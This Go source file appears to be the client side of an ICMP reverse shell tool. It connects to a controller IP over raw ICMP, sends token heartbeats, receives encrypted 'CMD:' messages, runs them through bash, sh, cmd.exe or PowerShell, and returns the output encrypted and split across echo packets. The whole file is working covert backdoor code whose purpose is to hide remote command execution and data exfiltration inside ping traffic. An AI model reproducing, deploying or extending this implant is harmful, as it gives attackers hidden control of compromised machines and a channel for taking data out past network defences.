package shell

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
	"unicode/utf8"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"

	"github.com/d1nfinite/go-icmpshell/common"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

type Shell struct {
	icmpId        uint16
	conn          *icmp.PacketConn
	dest          net.Addr
	seq           int
	logs          bool
	usePowershell bool
	common.Auth
}

type Option func(shell *Shell) *Shell

func WithToken(token []byte) Option {
	return func(shell *Shell) *Shell {
		shell.Token = token
		return shell
	}
}

func WithIcmpId(id uint16) Option {
	return func(shell *Shell) *Shell {
		shell.icmpId = id
		return shell
	}
}

func WithLogs(enable bool) Option {
	return func(shell *Shell) *Shell {
		shell.logs = enable
		return shell
	}
}

func WithPowershell(enable bool) Option {
	return func(shell *Shell) *Shell {
		shell.usePowershell = enable
		return shell
	}
}

func NewShell(ip net.IP, opts ...Option) (*Shell, error) {
	// Listen on all interfaces for ICMP
	// "ip4:icmp" requires root privileges and allows handling ICMP packets directly
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return nil, err
	}

	s := &Shell{
		conn:   conn,
		icmpId: 1000,
		Auth:   common.Auth{Token: []byte{10, 10}},
		dest:   &net.IPAddr{IP: ip},
		seq:    1,
	}

	// Options
	for _, opt := range opts {
		s = opt(s)
	}

	return s, nil
}

func (s *Shell) Handshake() error {
	// Send token to server
	// Client sends Echo Request
	err := s.SendICMP(s.Token, s.icmpId, ipv4.ICMPTypeEcho)
	if err != nil {
		return err
	}

	return nil
}

func (s *Shell) SendICMP(payload []byte, icmpId uint16, icmpType ipv4.ICMPType) error {
	// Fragment for payload
	// Removed: Fragmentation should be handled by caller to ensure headers are preserved in each fragment.
	// if len(payload) > 576 { ... }

	body := &icmp.Echo{
		ID:   int(icmpId),
		Seq:  s.seq,
		Data: payload,
	}
	s.seq++

	msg := icmp.Message{
		Type: icmpType,
		Code: 0,
		Body: body,
	}

	msgBytes, err := msg.Marshal(nil)
	if err != nil {
		return err
	}

	if s.logs {
		fmt.Printf("Send: ID=%d Seq=%d Len=%d Type=%v\n", icmpId, s.seq-1, len(payload), icmpType)
	}
	_, err = s.conn.WriteTo(msgBytes, s.dest)
	return err
}

func (s *Shell) ListenICMP() {
	buf := make([]byte, 1500)
	lastOutput := s.Token // Used for duplication check and also as the payload for heartbeat

	// Heartbeat ticker
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	// Packet channel
	packetChan := make(chan *icmp.Echo, 10)

	fmt.Println("Shell started, listening for ICMP packets...")

	// Reader goroutine
	go func() {
		for {
			n, peer, err := s.conn.ReadFrom(buf)
			if err != nil {
				fmt.Println(err)
				continue
			}

			// Filter packets
			if peerAddr, ok := peer.(*net.IPAddr); ok {
				if !peerAddr.IP.Equal(s.dest.(*net.IPAddr).IP) {
					continue
				}
			} else {
				continue
			}

			// Parse ICMP message
			msg, err := icmp.ParseMessage(1, buf[:n]) // 1 is ICMPv4 protocol number
			if err != nil {
				fmt.Println("ParseMessage error:", err)
				continue
			}

			switch body := msg.Body.(type) {
			case *icmp.Echo:
				if body.ID == int(s.icmpId) {
					if s.logs {
						fmt.Printf("Recv: ID=%d Seq=%d Len=%d Type=%v\n", body.ID, body.Seq, len(body.Data), msg.Type)
					}
					// Deep copy body to send to channel
					newBody := &icmp.Echo{
						ID:   body.ID,
						Seq:  body.Seq,
						Data: make([]byte, len(body.Data)),
					}
					copy(newBody.Data, body.Data)
					packetChan <- newBody
				}
			}
		}
	}()

	for {
		select {
		case <-ticker.C:
			// Send heartbeat/poll
			// Use lastOutput as payload so server knows we are just keeping alive or retrying last result
			// If lastOutput was huge, maybe we should just send Token or Empty?
			// Let's send Token to be safe and small.
			// But if we send Token, Server might treat it as Handshake again?
			// Server logic: if payload == Token -> Handshake.
			// If we send Token, Server replies with pending command.
			// So sending Token is fine.
			// fmt.Println("Sending heartbeat...")
			err := s.SendICMP(s.Token, s.icmpId, ipv4.ICMPTypeEcho)
			if err != nil {
				fmt.Println("Heartbeat error:", err)
			}

		case echo := <-packetChan:
			data := echo.Data
			// Received packet

			// Auto reply check / Echo back check
			if bytes.Equal(lastOutput, data) {
				continue
			}

			// Check if data is Token (Heartbeat/KeepAlive from Server)
			// Must check BEFORE Decrypt because Decrypt(Token) will succeed but produce garbage
			if bytes.Equal(s.Token, data) {
				continue
			}

			// Decrypt data
			commandDecrypt, err := s.Decrypt(data)
			if err != nil {
				continue
			}

			// Check Protocol Header
			var finalCommand []byte
			if bytes.HasPrefix(commandDecrypt, []byte("CMD:")) {
				// Valid Command from Server
				finalCommand = commandDecrypt[4:]
			} else if bytes.HasPrefix(commandDecrypt, []byte("OUT:")) {
				// Reflection of our own Output (Kernel Reflection)
				// Ignore
				if s.logs {
					fmt.Println("Ignored reflected output packet")
				}
				continue
			} else {
				// No header -> Legacy or Garbage
				// Ignore
				if s.logs {
					fmt.Println("Ignored packet without header")
				}
				continue
			}

			// If decrypted data is empty or just whitespace/nulls, ignore it
			if len(bytes.TrimSpace(bytes.TrimRight(finalCommand, "\x00"))) == 0 {
				continue
			}

			// Execute command
			output, err := s.execute(finalCommand)
			if err != nil {
				// If command execution failed, but we have output (stderr), return it.
				// s.execute already handles returning output even on error if output is not empty.
				// If output is empty and err is not nil, we might want to return the error message.
				// But wait, s.execute returns (output, err).
				// If err != nil:
				//   If output is valid (e.g. stderr), we should send it back.
				//   If output is nil/empty, we should send err.Error().

				fmt.Println(err)

				// s.execute returns (utf8Output, nil) if there is output even if cmd failed.
				// It returns (nil, err) only if there is NO output and cmd failed.
				if len(output) == 0 {
					output = []byte(err.Error())
				}
				// If output is not empty, we just fall through and send it.
			}
			output = append(output, []byte("\n")...)

			// Add Protocol Header "OUT:" and Fragment
			const maxChunkSize = 1000
			for len(output) > 0 {
				chunkSize := maxChunkSize
				if len(output) < chunkSize {
					chunkSize = len(output)
				}
				chunk := output[:chunkSize]
				output = output[chunkSize:]

				outputWithHeader := append([]byte("OUT:"), chunk...)
				outputEncrypt, err := s.Encrypt(outputWithHeader)
				if err != nil {
					fmt.Println(err)
					break
				}
				lastOutput = outputEncrypt

				// Send output fragment
				err = s.SendICMP(outputEncrypt, s.icmpId, ipv4.ICMPTypeEcho)
				if err != nil {
					fmt.Println(err)
					break
				}
			}
		}
	}
}

func (s *Shell) execute(payload []byte) ([]byte, error) {
	// Clean the command payload to remove null bytes and trim whitespace
	commandStr := string(bytes.TrimRight(payload, "\x00"))
	commandStr = strings.TrimSpace(commandStr)

	fmt.Printf("Executing command: %q\n", commandStr)

	if commandStr == "" {
		return []byte("empty command"), nil
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		if s.usePowershell {
			// PowerShell mode: use -Command to execute
			cmd = exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", commandStr)
		} else {
			// CMD mode
			cmd = exec.Command("cmd.exe", "/C", commandStr)
		}
	} else {
		shellPath := "/bin/bash"
		if _, err := exec.LookPath(shellPath); err != nil {
			shellPath = "/bin/sh"
		}
		cmd = exec.Command(shellPath, "-c", commandStr)
	}

	if runtime.GOOS == "windows" {
		cmd.Env = os.Environ()
	} else {
		cmd.Env = append(os.Environ(), "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin")
	}

	output, err := cmd.CombinedOutput() // Capture stderr too
	if err != nil {
		fmt.Printf("Command execution error: %v, Output: %s\n", err, output)
		if len(output) > 0 {
			if runtime.GOOS == "windows" {
				if isUTF8(output) {
					return output, nil
				}
				reader := transform.NewReader(bytes.NewReader(output), simplifiedchinese.GBK.NewDecoder())
				utf8Output, _ := ioutil.ReadAll(reader)
				return utf8Output, nil
			}
			return output, nil
		}
		return nil, err
	}

	if runtime.GOOS == "windows" {
		// Detect if output is already UTF-8
		// If it is valid UTF-8, we should not decode it as GBK.
		// However, reliably detecting encoding is hard.
		// Common scenario: cmd.exe outputs GBK. PowerShell outputs GBK (by default) or UTF-8 (if configured).
		// If we decode UTF-8 as GBK, it will garble.
		// Simple heuristic: Try to decode as GBK. If it fails or produces replacement characters for common ASCII, maybe it's not GBK?
		// No, standard ASCII is compatible with GBK.
		//
		// Alternative: Assume GBK by default (most common for unconfigured Windows).
		// But if the user is running `curl` or tools that output UTF-8, we mess it up.
		//
		// Let's try to validate if it is valid UTF-8 first?
		// If it's valid UTF-8 and contains non-ASCII characters, we might assume it IS UTF-8.
		// But GBK bytes can also look like valid UTF-8 sequences sometimes.
		//
		// A safer bet for now:
		// If `usePowershell` is true, PowerShell might be outputting UTF-8 if user profile sets it.
		// But usually it's still OEM code page.
		//
		// Let's look at `curl cip.cc` output provided by user:
		// 鍦板潃 : 涓�浗 闄曡タ
		// This is classic "UTF-8 interpreted as GBK" or "GBK interpreted as UTF-8"?
		// "中国 陕西" (UTF-8 bytes) printed in a GBK terminal?
		// Or "中国 陕西" (GBK bytes) printed in a UTF-8 terminal?
		// The user's log shows `鍦板潃` which looks like UTF-8 bytes being displayed as something else.
		//
		// Actually, `curl` often detects terminal and outputs accordingly, OR outputs raw bytes.
		// If `curl` outputs UTF-8, and our code converts GBK->UTF-8, we corrupt it.
		//
		// We should only convert if we are sure it is NOT UTF-8?
		// Or provide a flag?
		//
		// Let's use `utf8.Valid(output)` check?
		// `import "unicode/utf8"`
		// If it is valid UTF-8, we return it as is.
		// If not, we try GBK conversion.
		//
		// Most GBK Chinese strings are NOT valid UTF-8.
		// So this heuristic is quite good.

		if isUTF8(output) {
			return output, nil
		}

		reader := transform.NewReader(bytes.NewReader(output), simplifiedchinese.GBK.NewDecoder())
		utf8Output, _ := ioutil.ReadAll(reader)
		return utf8Output, nil
	}
	return output, nil
}

func isUTF8(b []byte) bool {
	return utf8.Valid(b)
}
